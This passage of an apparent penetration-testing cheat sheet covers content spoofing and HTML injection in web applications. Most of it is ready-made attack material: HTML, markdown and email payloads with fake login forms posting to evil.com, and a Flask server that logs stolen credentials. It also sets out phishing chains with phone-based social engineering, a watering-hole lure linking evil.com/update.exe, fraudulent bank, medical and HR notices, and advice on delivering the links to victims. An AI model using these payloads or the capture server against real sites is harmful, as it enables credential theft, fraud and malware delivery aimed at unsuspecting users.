window.location = 'https://target.com/page';
</script>
```
::

### Email Content Spoofing

::collapsible
---
label: "Manipulating Application-Sent Emails"
---

When applications send emails that include user-supplied content (notification messages, shared content, invitation text, feedback confirmations):

```text [Invitation Email — Injected Message]
# If the application sends: "USER_NAME has invited you to join PROJECT_NAME"
# And USER_NAME is controllable:

Username: John Smith</p><p>URGENT: Your account has been compromised. Reset your password immediately at: https://evil.com/reset</p><p>
```

```text [Feedback Email — Injected Content]
# If the application sends a confirmation: "Thank you for your feedback: USER_MESSAGE"
# And USER_MESSAGE is controllable:

Thank you for contacting us. Your case number is REF-2024-1234.

IMPORTANT: We need to verify your identity to process your request. Please reply to this email with:
- Your account password
- Last 4 digits of your SSN
- Date of birth

This information is required by our security team within 24 hours.
```

```text [Notification Email — Link Injection]
# If the application emails: "USER_NAME commented on your post: COMMENT_TEXT"
# And COMMENT_TEXT allows HTML:

Great post! <br><br>
<a href="https://evil.com/claim-prize">🎉 Click here to claim your $500 reward from target.com!</a>
```

```text [Share Feature — Phishing via Legitimate Email]
# Using the application's "Share this page" or "Send to a friend" feature:
# The email comes FROM the legitimate domain's email server
# But contains attacker-controlled content

Shared message: Check out this important security update from target.com: https://evil.com/fake-update
```

```text [Password Reset Email — Injected Instructions]
# If the application includes user input in password reset emails:
# E.g., "Password reset requested for: USER_EMAIL"

Email field: victim@target.com</p><p style="color:red;font-weight:bold">IMPORTANT: Due to a security incident, please also update your password at our backup site: https://evil.com/backup-reset</p><p>
```
::

### MIME Type & Content-Type Spoofing

::collapsible
---
label: "Content-Type Manipulation Payloads"
---

```http [Serve HTML as Text — Bypasses Text Rendering]
# If application serves user content with wrong Content-Type:
# Content-Type: text/html instead of text/plain
# Injected text becomes rendered HTML

GET /api/raw?content=<h1>Hacked</h1><script>alert(1)</script> HTTP/1.1
Host: target.com
```

```http [Force HTML Content-Type via Extension]
# Upload file with .html extension but inject form content:
POST /upload HTTP/1.1
Content-Type: multipart/form-data

filename: spoofed.html
content: <html><body><h1>Login Required</h1><form action="https://evil.com">...</form></body></html>
```

```http [SVG Content Spoofing]
# SVG files can contain HTML-like elements:
POST /upload HTTP/1.1
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject width="400" height="300">
<body xmlns="http://www.w3.org/1999/xhtml">
<h2>Security Alert</h2>
<form action="https://evil.com/steal" method="POST">
<input name="user" placeholder="Username"><br>
<input name="pass" type="password" placeholder="Password"><br>
<button>Verify Identity</button>
</form>
</body>
</foreignObject>
</svg>
```

```http [PDF Content Spoofing via HTML-to-PDF]
# If application generates PDF from user HTML input:
POST /generate-pdf HTTP/1.1
Content-Type: application/json

{
  "html": "<h1 style='color:red'>CONFIDENTIAL - INTERNAL USE ONLY</h1><p>To: All Employees</p><p>Effective immediately, all employees must reset their network passwords at: https://evil.com/corporate-reset</p><p>IT Security Department</p>"
}
```

```text [Polyglot File — Image with HTML]
# Create a file that is both a valid image AND valid HTML:
# Browser may interpret based on context/headers
GIF89a/*<html><body><h1>Spoofed Content</h1></body></html>*/
```
::

### Markdown / Markup Injection

::collapsible
---
label: "Markdown-Based Content Spoofing"
---

When applications render user-supplied Markdown:

```markdown [Fake Admin Announcement]
# 🚨 URGENT: Security Update Required

All users must update their accounts by **December 31, 2024** or face account suspension.

## Required Actions:
1. Visit [Account Verification Portal](https://evil.com/verify)
2. Enter your current credentials
3. Set up enhanced security

> This is a mandatory update from the Security Team.

---
*IT Department - target.com*
```

```markdown [Fake Documentation Update]
## ⚠️ API Key Migration Notice

Your current API keys will be deprecated on **January 1, 2025**.

To generate new API keys, visit: [API Key Portal](https://evil.com/api-keys)

You will need to provide:
- Current API key
- Account password
- Organization name

**Failure to migrate will result in API access revocation.**
```

```markdown [Markdown Image Injection]
![Official Announcement](https://evil.com/fake-announcement.png)

---

For more information, contact [support](https://evil.com/support).
```

```markdown [Markdown Link Disguise]
[https://target.com/secure-login](https://evil.com/phishing)
<!-- Displays target.com URL but links to evil.com -->
```

```markdown [Markdown Table — Fake Data]
## Latest Transactions

| Date | Description | Amount |
|------|------------|--------|
| 2024-12-01 | Unauthorized transfer | -$5,000.00 |
| 2024-12-02 | Unauthorized purchase | -$2,350.00 |
| 2024-12-03 | Unauthorized withdrawal | -$8,900.00 |

**Total unauthorized activity: $16,250.00**

[Report fraud immediately](https://evil.com/fraud-report)
```
::

---

## Attack Techniques

### Technique 1 — Error Page Content Injection

Many applications reflect user input in error pages without proper sanitization.

::collapsible
---
label: "Error Page Exploitation"
---

```text [404 Page — URL Path Injection]
https://target.com/INJECTED_TEXT_HERE_YOUR_ACCOUNT_IS_LOCKED
# If 404 page shows: "Page not found: /INJECTED_TEXT_HERE_YOUR_ACCOUNT_IS_LOCKED"
```

```text [404 Page — HTML in Path]
https://target.com/<h1>Account%20Suspended</h1><p>Contact%20support@evil.com</p>
```

```text [Validation Error — Reflected Input]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=<h2>URGENT: Security Alert</h2><p>Your account requires immediate verification at <a href="https://evil.com">https://secure.target.com/verify</a></p>
# If error page shows: "Invalid email: <rendered HTML>"
```

```text [403 Error — Referer Injection]
GET /admin HTTP/1.1
Referer: <h1>Access Revoked</h1><p>Contact admin@evil.com</p>
# If 403 page includes Referer in message
```

```text [500 Error — Parameter Injection]
GET /api?callback=<div style="background:red;color:white;padding:20px"><h2>Server Error</h2><p>Database corrupted. Contact emergency support: +1-800-SCAM</p></div>
```

```text [Login Error — Username Reflection]
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=<b>Your account has been locked</b>. Contact support at evil.com&password=wrong
# If error shows: "Invalid credentials for: <b>Your account has been locked</b>. Contact support at evil.com"
```
::

### Technique 2 — Search Result Manipulation

::collapsible
---
label: "Search Feature Content Spoofing"
---

```text [Search Query Reflection — Text]
https://target.com/search?q=WARNING: This site has been flagged for phishing. Contact your bank immediately at 1-800-SCAM.
```

```text [Search Query Reflection — HTML]
https://target.com/search?q=<div style="background:%23fff3cd;border:1px solid %23ffc107;padding:20px;border-radius:8px"><h3 style="color:%23856404">⚠️ Security Notice</h3><p>Your search activity has triggered a security review. <a href="https://evil.com/verify">Verify your identity</a></p></div>
```

```text [Search with No Results — Fake Content]
https://target.com/search?q=<h2>Maintenance Notice</h2><p>Search is temporarily unavailable. Use our backup search at: <a href="https://evil.com/search">backup.target.com/search</a></p>
```

```text [Search Autocomplete Spoofing]
# If the search autocomplete reflects user input:
https://target.com/api/autocomplete?q=<img src=x onerror=this.src='https://evil.com/beacon'>account compromised call 1800SCAM
```
::

### Technique 3 — Profile / User Content Injection

::collapsible
---
label: "User-Generated Content Spoofing"
---

```text [Username as Displayed Name]
# Register with username:
SYSTEM_ADMINISTRATOR: Your account requires verification
# Other users see this as a post/comment author
```

```text [Bio/About Field Injection]
# Set profile bio to:
⚠️ NOTICE FROM ADMIN: All users must re-verify their accounts at https://evil.com/verify by end of month or accounts will be suspended. This is mandatory. — IT Security Team
```

```text [Comment/Review Content Spoofing]
# Post a comment or review:
★★★★★ Great service! 

IMPORTANT UPDATE FROM MANAGEMENT: Due to a data breach, all customers must update their payment information at https://evil.com/update-payment immediately. Reference: BREACH-2024-001

We apologize for the inconvenience.
— Customer Service Team
```

```text [Forum Post — Fake Admin Announcement]
# Post with HTML if allowed:
<div style="background:#d4edda;border:1px solid #c3e6cb;padding:15px;border-radius:8px">
<strong>📢 Official Announcement from Admin Team</strong>
<p>We are migrating to a new authentication system. All users must update their credentials at our new secure portal: <a href="https://evil.com/new-portal">https://secure.target.com/migration</a></p>
<p><em>— Site Administrator</em></p>
</div>
```

```text [Product Description Spoofing]
# If sellers can edit product descriptions:
Limited Time Offer - 90% OFF!

⚠️ PRODUCT RECALL NOTICE: This product has been recalled by the manufacturer. 
For a full refund, visit: https://evil.com/refund
Include your order number and payment details for immediate processing.
```
::

### Technique 4 — PDF / Document Content Spoofing

::collapsible
---
label: "Document Generation Spoofing"
---

```text [Invoice Content Manipulation]
# If user input appears in generated invoices:
# Company Name field:
Target Corp — PAYMENT INSTRUCTIONS CHANGED: Send all payments to: Bank: Scam Bank, Account: 999999, Routing: 111111

# The generated PDF invoice shows new payment instructions
# under the official company branding
```

```text [Certificate Content Manipulation]
# If user input appears in generated certificates:
# Name field:
John Smith — This certificate has been REVOKED. Contact admin@evil.com for reissue.
```

```text [Report Content Manipulation]
# If user input appears in generated reports:
# Notes/Comments field:
CONFIDENTIAL NOTICE: This report contains errors. The corrected version is available at: https://evil.com/corrected-report. Do not distribute this version.
```

```text [Contract/Agreement Manipulation]
# If user-supplied terms appear in generated contracts:
Standard terms apply with the following exception: All disputes shall be resolved by contacting arbitration@evil.com. Payment terms: Immediate wire transfer to Account 123456789.
```
::

### Technique 5 — Notification & Alert Spoofing

::collapsible
---
label: "In-App Notification Manipulation"
---

```text [Push Notification Content Injection]
# If the application sends push notifications with user content:
# Message field:
🚨 URGENT: Unauthorized login detected from IP 185.x.x.x (Russia). Tap to secure your account immediately.

# The push notification appears to come from the legitimate app
```

```text [In-App Alert/Toast Injection]
# If user input appears in alert/toast messages:
# Status parameter:
success=false&message=CRITICAL: Your session has been hijacked. Log out immediately and change your password at: https://evil.com/emergency-reset
```

```text [Webhook Notification Spoofing]
# If webhook payloads are rendered in UI:
{
  "event": "security_alert",
  "message": "Unauthorized API access detected. Revoke all API keys at: https://evil.com/revoke-keys",
  "severity": "critical",
  "source": "Security Operations Center"
}
```

```text [Chat/Messaging Content Spoofing]
# In chat applications where messages are rendered:
# Send message as:
[SYSTEM MESSAGE] This conversation has been flagged for security review. Please verify your identity at: https://evil.com/verify

DO NOT share any personal information in this chat until verification is complete.

— Automated Security System
```
::

---

## Chained Exploitation

### Content Spoofing → Credential Theft

::steps{level="4"}

#### Identify Reflection Point

```http
GET /search?q=test HTTP/1.1
Host: target.com

# Response contains: "You searched for: test"
# HTML rendering confirmed with: ?q=<b>test</b>
```

#### Craft Credential Harvesting Form

```text
https://target.com/search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;display:flex;align-items:center;justify-content:center"><div style="max-width:400px;text-align:center"><h2>Session Expired</h2><p>Please log in again</p><form action="https://evil.com/steal" method="POST"><input name="user" placeholder="Username" style="width:100%;padding:10px;margin:5px 0"><br><input name="pass" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0"><br><button style="width:100%;padding:10px;background:%23007bff;color:white;border:none">Log In</button></form></div></div>
```

#### Set Up Credential Capture Server

```python [capture_server.py]
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('user', '')
    password = request.form.get('pass', '')
    
    # Log stolen credentials
    with open('stolen_creds.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    # Redirect victim back to legitimate site
    return redirect('https://target.com/login?error=invalid_credentials')

app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

#### Distribute Spoofed URL

Send the crafted URL to victims via:
- Email (appears to come from trusted domain)
- Social media messages
- SMS / WhatsApp
- QR codes
- Embedded in other websites
- Search engine poisoning

#### Victim Interacts with Fake Content

The victim sees `target.com` in the URL bar, sees the fake login form styled to match the site, enters credentials, and the form submits to `evil.com`. The victim is then redirected back to the real login page with an "invalid credentials" error — believing they mistyped their password.

::

### Content Spoofing → Social Engineering Escalation

::steps{level="4"}

#### Phase 1 — Initial Trust Establishment

Inject a convincing security notice on the trusted domain:

```text
https://target.com/search?q=<div style="background:%23dc3545;color:white;padding:20px;text-align:center;border-radius:4px"><strong>🚨 Account Security Alert</strong><br>We detected suspicious login attempts. Please call our security team: +1-800-555-SCAM</div>
```

#### Phase 2 — Phone Call Exploitation

When victim calls the fake number, the attacker (posing as support):
- Confirms they "see the alert" on the victim's account
- Asks for verification: username, email, date of birth
- Asks for current password "to verify identity"
- Instructs victim to install remote access software
- Walks victim through "security verification" that grants attacker full access

#### Phase 3 — Full Account Takeover

With credentials obtained via phone + content spoofing:
- Change password
- Change recovery email/phone
- Disable 2FA
- Access sensitive data
- Lateral movement to other accounts using same credentials

::

### Content Spoofing → Watering Hole Attack

::steps{level="4"}

#### Identify High-Value Target Page

Find a page frequently visited by target employees (internal wiki, company portal, HR system) that is vulnerable to content spoofing.

#### Inject Malware Distribution Content

```text
https://internal.target.com/news?announcement=<div style="background:%23d4edda;padding:20px;border-radius:8px"><h3>📢 Mandatory Software Update</h3><p>IT has released a critical security update that must be installed by all employees before Friday.</p><a href="https://evil.com/update.exe" style="display:inline-block;background:%23007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Download Update</a><p style="font-size:12px;color:%23666">IT Helpdesk - Extension 5555</p></div>
```

#### Internal Distribution

Share the URL via:
- Internal chat (Slack, Teams)
- Internal email
- Meeting invitations
- Internal documentation links

Because the URL is on the **internal company domain**, employees trust it implicitly.

::

---

## Context-Specific Attacks

### Banking & Financial Applications

::collapsible
---
label: "Financial Sector Content Spoofing"
---

```text [Fake Wire Transfer Instructions]
https://banking.com/messages?alert=<div style="background:%23fff3cd;padding:20px;border:1px solid %23ffc107;border-radius:8px"><h3>Wire Transfer Instructions Updated</h3><p>Due to a system migration, our receiving bank details have changed:</p><table style="width:100%;border-collapse:collapse"><tr><td style="padding:8px;border:1px solid %23ddd"><strong>Bank</strong></td><td style="padding:8px;border:1px solid %23ddd">Scam National Bank</td></tr><tr><td style="padding:8px;border:1px solid %23ddd"><strong>Account</strong></td><td style="padding:8px;border:1px solid %23ddd">9999888877</td></tr><tr><td style="padding:8px;border:1px solid %23ddd"><strong>Routing</strong></td><td style="padding:8px;border:1px solid %23ddd">111222333</td></tr></table><p style="font-size:12px;color:%23666">Effective immediately. Previous bank details are no longer valid.</p></div>
```

```text [Fake Account Balance]
https://banking.com/dashboard?notice=<div style="background:%23dc3545;color:white;padding:15px;border-radius:8px"><strong>⚠️ FRAUD ALERT</strong>: Unauthorized transactions totaling $12,450.00 have been detected on your account. <a href="https://evil.com/dispute" style="color:%23ffd700">File a dispute immediately</a> or call our fraud department at 1-800-SCAM-NOW</div>
```
::

### Healthcare Applications

::collapsible
---
label: "Healthcare Content Spoofing"
---

```text [Fake Medical Result]
https://health.com/results?info=<div style="background:%23f8d7da;padding:20px;border:1px solid %23f5c6cb;border-radius:8px"><h3 style="color:%23721c24">⚠️ Urgent: Test Results Available</h3><p>Your recent lab results require immediate attention. An abnormality was detected. Please contact Dr. Fake at evil-clinic.com or call 1-800-FAKE-DOC to schedule an emergency consultation.</p><p style="font-size:12px;color:%23666">This notification is time-sensitive. Delays may affect your health outcome.</p></div>
```

```text [Fake Prescription Update]
https://health.com/prescriptions?msg=<div style="background:%23cce5ff;padding:15px;border:1px solid %23b8daff;border-radius:8px"><h4>Prescription Update Notice</h4><p>Your prescription has been updated. To verify and authorize the change, please log in to the new patient portal: <a href="https://evil.com/patient-portal">https://secure.health-portal.com</a></p></div>
```
::

### E-Commerce Applications

::collapsible
---
label: "E-Commerce Content Spoofing"
---

```text [Fake Order Confirmation Manipulation]
https://shop.com/order?status=<div style="background:%23d4edda;padding:20px;border-radius:8px"><h3>✅ Order Confirmed - Special Offer!</h3><p>As a valued customer, you've been selected for an exclusive 90%25 discount on your next order. Claim your discount code at: <a href="https://evil.com/discount">https://shop.com/vip-offer</a></p><p>Enter your payment details to receive instant credit.</p></div>
```

```text [Fake Product Recall]
https://shop.com/product/123?notice=<div style="background:%23f8d7da;padding:15px;border:1px solid %23f5c6cb;border-radius:8px"><h4>⚠️ PRODUCT SAFETY RECALL</h4><p>This product has been recalled due to safety concerns. For a full refund, visit: <a href="https://evil.com/recall-refund">Recall Portal</a></p><p>You will need your order number and credit card details for verification.</p></div>
```

```text [Fake Shipping Update]
https://shop.com/orders?msg=<div style="padding:15px;border-left:4px solid %23ffc107"><strong>Shipping Update:</strong> Your package delivery requires additional verification. A customs fee of $29.99 is required. Pay at: <a href="https://evil.com/customs-fee">Pay Customs Fee</a></div>
```
::

### Corporate / Enterprise Applications

::collapsible
---
label: "Enterprise Application Content Spoofing"
---

```text [Fake IT Department Notice]
https://portal.company.com/dashboard?alert=<div style="background:%23fff3cd;padding:20px;border-left:5px solid %23ffc107"><h3>IT Department Notice</h3><p>Our email system is being migrated to a new provider. To ensure uninterrupted email access:</p><ol><li>Visit <a href="https://evil.com/email-migration">Email Migration Portal</a></li><li>Enter your current email credentials</li><li>Set up your new mailbox</li></ol><p>Deadline: End of business today.</p><p>— IT Helpdesk</p></div>
```

```text [Fake HR Announcement]
https://hr.company.com/news?post=<div style="background:%23e2e3e5;padding:20px;border-radius:8px"><h3>📋 Annual Benefits Enrollment</h3><p>Open enrollment for 2025 benefits begins now. To update your benefits selections, submit your personal information including SSN and banking details at: <a href="https://evil.com/benefits">Benefits Portal</a></p><p>Deadline: December 31, 2024</p><p>— Human Resources</p></div>
```

```text [Fake Compliance Notice]
https://compliance.company.com/alerts?notice=<div style="background:%23f8d7da;padding:20px;border-radius:8px"><h3>⚠️ Compliance Violation Detected</h3><p>Your account has been flagged for a potential compliance violation (Ref: COMP-2024-789). To avoid disciplinary action, you must complete the compliance verification within 24 hours.</p><a href="https://evil.com/compliance-check" style="display:inline-block;background:%23dc3545;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Complete Verification Now</a></div>
```
::

---

## Automation & Detection Script

::collapsible
---
label: "Python Content Spoofing Scanner"
---

```python [content_spoof_scanner.py]
#!/usr/bin/env python3
"""
Content Spoofing Vulnerability Scanner
Tests URL parameters and form fields for content reflection.
"""

import requests
import sys
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

# === CONFIGURATION ===
TARGET_URL = "http://target.com"
TIMEOUT = 10
THREADS = 10

# === MARKERS ===
TEXT_MARKER = "CONTENT_SPOOF_MARKER_7x8k2m"
HTML_MARKER = "<h1>SPOOF_TEST_7x8k2m</h1>"
FORM_MARKER = '<form action="https://evil.com/test" method="POST"><input name="test" value="SPOOF_7x8k2m"></form>'

# === COMMON PARAMETERS ===
PARAMS_TO_TEST = [
    'q', 'query', 'search', 'keyword', 'term', 's',
    'msg', 'message', 'text', 'content', 'body',
    'error', 'err', 'alert', 'notice', 'info', 'warning',
    'status', 'result', 'output', 'response', 'data',
    'title', 'name', 'label', 'description', 'desc',
    'redirect', 'url', 'next', 'return', 'callback',
    'page', 'view', 'template', 'action', 'type',
    'comment', 'feedback', 'review', 'note', 'reason',
    'subject', 'from', 'to', 'cc', 'bcc',
    'username', 'user', 'email', 'display_name',
    'ref', 'source', 'utm_source', 'utm_campaign',
    'announcement', 'notification', 'banner', 'headline',
    'file', 'filename', 'path', 'dir', 'folder',
    'category', 'tag', 'topic', 'section',
    'lang', 'locale', 'language', 'country',
    'format', 'mode', 'style', 'theme',
]


def test_reflection(base_url, param, marker, marker_type):
    """Test if a parameter reflects content in the response."""
    try:
        encoded = urllib.parse.quote(marker)
        url = f"{base_url}?{param}={encoded}"
        
        resp = requests.get(url, timeout=TIMEOUT, verify=False,
                          headers={'User-Agent': 'Mozilla/5.0'})
        
        if resp.status_code in [200, 201, 301, 302, 400, 403, 404, 500]:
            body = resp.text
            
            # Check for text reflection
            if TEXT_MARKER in body and marker_type == "text":
                return {
                    'vulnerable': True,
                    'param': param,
                    'type': 'Text Reflection',
                    'url': url,
                    'status': resp.status_code
                }
            
            # Check for HTML rendering (unescaped)
            if marker_type == "html":
                if '<h1>SPOOF_TEST_7x8k2m</h1>' in body:
                    return {
                        'vulnerable': True,
                        'param': param,
                        'type': 'HTML Injection (Rendered)',
                        'url': url,
                        'status': resp.status_code
                    }
                elif '&lt;h1&gt;SPOOF_TEST_7x8k2m&lt;/h1&gt;' in body:
                    return {
                        'vulnerable': True,
                        'param': param,
                        'type': 'Text Reflection (HTML Escaped)',
                        'url': url,
                        'status': resp.status_code
                    }
            
            # Check for form rendering
            if marker_type == "form" and 'action="https://evil.com/test"' in body:
                return {
                    'vulnerable': True,
                    'param': param,
                    'type': 'Form Injection (Critical)',
                    'url': url,
                    'status': resp.status_code
                }
        
        return {'vulnerable': False}
        
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}


def scan_url(base_url):
    """Scan a URL for content spoofing vulnerabilities."""
    print(f"\n{'='*60}")
    print(f"  Content Spoofing Scanner")
    print(f"{'='*60}")
    print(f"  Target: {base_url}")
    print(f"  Parameters: {len(PARAMS_TO_TEST)}")
    print(f"{'='*60}\n")
    
    findings = []
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        
        for param in PARAMS_TO_TEST:
            # Test text reflection
            futures.append(executor.submit(
                test_reflection, base_url, param, TEXT_MARKER, "text"))
            # Test HTML rendering
            futures.append(executor.submit(
                test_reflection, base_url, param, HTML_MARKER, "html"))
            # Test form injection
            futures.append(executor.submit(
                test_reflection, base_url, param, FORM_MARKER, "form"))
        
        for future in as_completed(futures):
            result = future.result()
            if result.get('vulnerable'):
                findings.append(result)
                severity = "🔴 CRITICAL" if "Form" in result['type'] else \
                          "🟡 HIGH" if "HTML" in result['type'] and "Rendered" in result['type'] else \
                          "🟢 MEDIUM"
                print(f"  [{severity}] {result['type']}")
                print(f"    Parameter: {result['param']}")
                print(f"    Status: {result['status']}")
                print(f"    URL: {result['url'][:100]}...")
                print()
    
    print(f"\n{'='*60}")
    print(f"  Results: {len(findings)} content spoofing vectors found")
    
    critical = len([f for f in findings if 'Form' in f['type']])
    high = len([f for f in findings if 'Rendered' in f['type']])
    medium = len([f for f in findings if 'Text' in f['type'] or 'Escaped' in f['type']])
    
    print(f"  Critical (Form Injection): {critical}")
    print(f"  High (HTML Rendering): {high}")
    print(f"  Medium (Text Reflection): {medium}")
    print(f"{'='*60}")
    
    return findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} https://target.com/search")
        sys.exit(1)
    
    scan_url(sys.argv[1])
```
::

---

## Methodology

::accordion
  :::accordion-item
  ---
  icon: i-lucide-search
  label: "Phase 1 — Reflection Point Discovery"
  ---

  Map every point where user input is reflected in the application's rendered output.

  ::field-group
    ::field{name="URL Parameters" type="high-priority"}
    Test every URL parameter by injecting a unique marker string and searching the response body.
    ::

    ::field{name="Form Fields" type="high-priority"}
    Submit forms and check if input values appear in the response (confirmation pages, error messages, profile displays).
    ::

    ::field{name="URL Path Segments" type="medium-priority"}
    Inject markers in URL path segments and check breadcrumbs, titles, and navigation elements.
    ::

    ::field{name="HTTP Headers" type="medium-priority"}
    Check if `User-Agent`, `Referer`, `Accept-Language`, or custom headers are reflected in admin panels, analytics pages, or error messages.
    ::

    ::field{name="API Responses Rendered in UI" type="high-priority"}
    Identify API endpoints whose responses are rendered in the browser — debug interfaces, API explorers, webhook testers.
    ::

    ::field{name="Error Pages" type="high-priority"}
    Trigger 404, 403, 500, and validation errors with injected content. Error pages frequently reflect user input.
    ::

    ::field{name="Email Content" type="medium-priority"}
    Test invitation, notification, and sharing features where user input appears in sent emails.
    ::
  ::

  :::

  :::accordion-item
  ---
  icon: i-lucide-flask-conical
  label: "Phase 2 — Rendering Context Analysis"
  ---

  For each reflection point, determine the rendering context:

  | Test | Inject | Result if Vulnerable |
  |------|--------|---------------------|
  | **Text reflects?** | `SPOOF_MARKER_123` | Marker visible in page |
  | **HTML renders?** | `<h1>TEST</h1>` | Heading is rendered (not raw text) |
  | **Attributes break?** | `" onclick="test` | Attribute breakout possible |
  | **Tags render?** | `<img src=x>` | Image tag created in DOM |
  | **Forms render?** | `<form action="...">` | Form element created |
  | **Styles render?** | `<div style="color:red">` | Styled element appears |
  | **Iframes render?** | `<iframe src="...">` | Iframe embedded in page |
  | **Markdown renders?** | `# Heading\n**bold**` | Formatted markdown |
  | **HTML escaped?** | `<b>test</b>` | Shows `&lt;b&gt;test&lt;/b&gt;` |

  :::

  :::accordion-item
  ---
  icon: i-lucide-syringe
  label: "Phase 3 — Payload Crafting"
  ---

  Based on the rendering context, craft context-appropriate payloads:

  | Context | Payload Strategy |
  |---------|-----------------|
  | **Text only (HTML escaped)** | Plain text social engineering — fake alerts, phone numbers, instructions |
  | **HTML rendered** | Fake forms, styled alerts, iframe overlays, image injection |
  | **Markdown rendered** | Markdown-formatted fake announcements, links, images |
  | **DOM-based (JS processes)** | Hash fragment or parameter injection into DOM sinks |
  | **Email body** | Inject phishing links and fake instructions into application emails |
  | **PDF/Document** | Inject misleading content into generated documents |

  **Payload Design Principles:**
  - Match the application's **visual style** (colors, fonts, spacing)
  - Use **urgency language** (URGENT, CRITICAL, IMMEDIATELY)
  - Include **official-sounding identifiers** (Reference: SEC-2024-001)
  - Target **high-value actions** (password change, payment update, identity verification)
  - Include a **call-to-action** that benefits the attacker (link, phone number, form)

  :::

  :::accordion-item
  ---
  icon: i-lucide-send
  label: "Phase 4 — Delivery & Social Engineering"
  ---

  Craft the final URL and delivery mechanism:

  **URL Shortening:**
  - Long spoofed URLs are suspicious
  - Use URL shorteners or the application's own short URL feature
  - Encode the payload to make it less obvious

  **Delivery Methods:**

  | Method | Effectiveness | Notes |
  |--------|-------------|-------|
  | Email | **High** | Spoofed URL on trusted domain bypasses email filters |
  | Slack/Teams/Chat | **High** | Internal links are trusted by employees |
  | SMS/WhatsApp | **High** | Short URLs hide the payload |
  | QR Code | **High** | Full URL is hidden from victim |
  | Social Media | **Medium** | Link preview may show trusted domain |
  | Embedded in another site | **Medium** | Redirect through trusted domain |
  | Watering Hole | **Very High** | Inject into frequently visited page |

  :::

  :::accordion-item
  ---
  icon: i-lucide-check-circle
  label: "Phase 5 — Impact Demonstration"
  ---

  Document the full attack chain for the report:

  1. **Screenshot** of the spoofed page with trusted URL visible in address bar
  2. **Comparison** with the legitimate page showing the visual similarity
  3. **Credential capture** demonstration (submit test credentials, show they arrive on attacker server)
  4. **Social engineering scenario** — describe a realistic attack narrative
  5. **Business impact** — what data could be stolen, what actions could be triggered

  **Severity Assessment:**

  | Spoofing Type | Impact | Typical Severity |
  |--------------|--------|-----------------|
  | Form injection (credentials) | Direct credential theft | **High** |
  | Full page replacement | Complete phishing | **High** |
  | Fake security alerts + phone number | Social engineering | **High** |
  | Iframe injection (external page) | Full content control | **High** |
  | Fake download links (malware delivery) | Endpoint compromise | **High** |
  | Text-only injection (alerts/warnings) | Social engineering | **Medium** |
  | Image injection (fake logos/screenshots) | Brand impersonation | **Medium** |
  | Link injection (redirect to external) | Phishing redirection | **Medium** |
  | Email content injection | Email-based phishing | **Medium-High** |
  | Document/PDF content injection | Document fraud | **Medium** |

  :::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept requests, modify parameters, and test content reflection. Use Repeater for manual payload testing. Scanner detects some reflection points automatically. Intruder for parameter fuzzing.
  ::

  ::card
  ---
  title: Param Miner
  icon: i-lucide-search
  to: https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
  target: _blank
  ---
  Burp extension that discovers hidden parameters. Identifies reflection points by fuzzing with thousands of parameter names and detecting when values appear in responses.
  ::

  ::card
  ---
  title: Arjun
  icon: i-lucide-radar
  to: https://github.com/s0md3v/Arjun
  target: _blank
  ---
  HTTP parameter discovery tool. Finds hidden URL parameters that reflect content. Essential for discovering non-obvious content spoofing injection points.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for testing parameter names and values. Use with parameter wordlists to discover reflection points at high speed.
  ::

  ::card
  ---
  title: Dalfox
  icon: i-lucide-flame
  to: https://github.com/hahwul/dalfox
  target: _blank
  ---
  XSS scanner that also detects HTML injection and content reflection points. Useful for identifying injection contexts where content spoofing is possible even if XSS is not.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based scanner with content injection detection templates. Custom templates can be written for application-specific content spoofing tests.
  ::

  ::card
  ---
  title: Social Engineering Toolkit (SET)
  icon: i-lucide-users
  to: https://github.com/trustedsec/social-engineer-toolkit
  target: _blank
  ---
  Automates credential harvesting server setup. Clone target login pages and set up capture servers for content spoofing → credential theft chains.
  ::

  ::card
  ---
  title: GoPhish
  icon: i-lucide-mail
  to: https://github.com/gophish/gophish
  target: _blank
  ---
  Phishing framework for managing content spoofing campaigns. Track who clicks spoofed links, who submits credentials, and measure campaign effectiveness.
  ::
::